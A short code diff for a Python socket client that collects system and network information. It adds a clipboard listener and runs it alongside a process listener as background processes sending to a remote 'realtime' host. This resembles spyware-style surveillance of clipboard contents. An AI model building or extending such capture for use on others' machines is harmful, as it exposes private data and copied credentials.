@@ -3,9 +3,11 @@ from communication.id import SimpleVariableStorage
 import json
 from data.gather_info import get_system_information, get_network_information
 import sys
+import multiprocessing
 
 # Listeners
 from listeners.processes import process_listener
+from listeners.clipboard import clipboard_listener
 
 # Define a Socket Class, it will be used for handling communications between the client and server.
 class SocketClient:
@@ -66,7 +68,14 @@ class SocketClient:
       print(f"Socket Client -> Connected to {self.realtimehost}:{self.realtimeport}")
     
       # Start the real time listener
-      process_listener(self.realtimeclient)
+
+      process_process = multiprocessing.Process(target=process_listener, args=(self.realtimeclient,))
+      process_process.start()
+      
+      # Start the clipboard listener
+      clipboard_process = multiprocessing.Process(target=clipboard_listener, args=(self.realtimeclient,))
+      clipboard_process.start()
+
     except Exception as e:
       print(f"Socket Client -> Error connecting to {self.realtimehost}:{self.realtimeport}: {str(e)}")
       return
